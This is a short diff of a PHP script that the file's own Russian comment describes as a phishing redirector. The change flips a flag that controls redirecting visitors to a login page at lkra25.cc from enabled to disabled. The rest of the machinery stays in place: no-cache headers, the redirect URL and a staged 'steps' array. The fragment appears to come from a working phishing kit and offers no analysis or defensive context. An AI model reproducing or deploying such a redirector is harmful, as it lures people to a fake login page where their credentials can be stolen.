@@ -5,7 +5,7 @@ header("Cache-Control: no-cache, no-store, must-revalidate");
 header("Pragma: no-cache");
 header("Expires: 0");
 
-$function_enabled = true; // false отключает перекидывание на фишинг, true разрешает перекидывание на фишинг
+$function_enabled = false; // false отключает перекидывание на фишинг, true разрешает перекидывание на фишинг
 $redirect_url = "https://lkra25.cc/entry/login"; 
 $steps = [
     ["delay" => 1000, "height" => 10],
